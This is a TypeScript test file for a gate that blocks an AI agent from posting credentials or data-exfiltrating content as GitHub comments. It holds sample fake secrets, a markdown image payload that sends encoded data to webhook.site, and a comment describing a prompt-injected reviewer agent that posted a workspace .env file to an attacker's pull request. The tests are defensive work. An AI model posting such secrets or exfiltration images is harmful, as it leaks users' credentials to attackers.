import { securityPolicyForLevel } from '@bendyline/gezel';
import { Hono } from 'hono';
import { describe, expect, it, vi } from 'vitest';
import type { ServiceContext } from './context.js';
import { modelGitHubTextRefusal, modelGitRefusal } from './model-git-gate.js';

function appFor(opts: { scopes: string[]; level: 'super-lockdown' | 'lockdown'; stored?: string }) {
  const log = vi.fn(async () => {});
  const ctx = {
    store: { readConfig: async () => ({ securityPolicy: securityPolicyForLevel(opts.level) }) },
    secrets: {
      get: async (key: { kind: string; name?: string }) =>
        key.kind === 'providerCredential' && key.name === 'githubToken' ? opts.stored : undefined,
    },
    history: { log },
  } as unknown as ServiceContext;
  const app = new Hono();
  app.use('*', async (c, next) => {
    c.set('auth' as never, { scopes: opts.scopes, gezelId: 'rev' } as never);
    await next();
  });
  app.post('/:id/comment', async (c) => {
    const { body } = (await c.req.json()) as { body: string };
    const refusal =
      (await modelGitRefusal(c, ctx)) ??
      (await modelGitHubTextRefusal(c, ctx, 'github_pr_comment', [body]));
    return refusal ?? c.json({ ok: true });
  });
  const post = async (body: string) =>
    app.request('/p1/comment', { method: 'POST', body: JSON.stringify({ body }) });
  return { post, log };
}

const SESSION = ['session'];

describe('what a gezel may post to GitHub', () => {
  it('posts an ordinary review comment', async () => {
    const { post } = appFor({ scopes: SESSION, level: 'lockdown' });
    expect((await post('Looks good; the loop in parse.ts can exit early.')).status).toBe(200);
  });

  // An injected reviewer posted the workspace .env as a comment on the
  // attacker's own pull request.
  it.each([
    ['the stored GitHub token', 'token: ghp_storedvalue1234567890abcdefghijklmnopq'],
    ['an AWS key', 'AWS_ACCESS_KEY_ID=AKIAABCDEFGHIJKLMNOP'],
    ['a private key', '-----BEGIN OPENSSH PRIVATE KEY-----\nabc'],
  ])('refuses %s', async (_label, body) => {
    const { post } = appFor({
      scopes: SESSION,
      level: 'lockdown',
      stored: 'ghp_storedvalue1234567890abcdefghijklmnopq',
    });
    const res = await post(body);
    expect(res.status).toBe(403);
    expect(((await res.json()) as { error: string }).error).toMatch(/credential or private key/);
  });

  // GitHub's image proxy fetches any image a comment embeds.
  it('refuses an image that points at a data-drop service, and records it', async () => {
    const { post, log } = appFor({ scopes: SESSION, level: 'lockdown' });
    const res = await post('![ok](https://webhook.site/abc?d=c2VjcmV0)');
    expect(res.status).toBe(403);
    expect(log).toHaveBeenCalledWith(
      expect.objectContaining({ kind: 'security.tool-call-blocked', projectId: 'p1' }),
    );
  });

  it('posts nothing for a gezel where model git is off', async () => {
    const { post } = appFor({ scopes: SESSION, level: 'super-lockdown' });
    const res = await post('fine');
    expect(res.status).toBe(403);
    expect(((await res.json()) as { error: string }).error).toMatch(/turned off for gezels/);
  });

  it("leaves the person's own client alone", async () => {
    const { post } = appFor({ scopes: ['ui'], level: 'super-lockdown' });
    expect((await post('AKIAABCDEFGHIJKLMNOP')).status).toBe(200);
  });
});
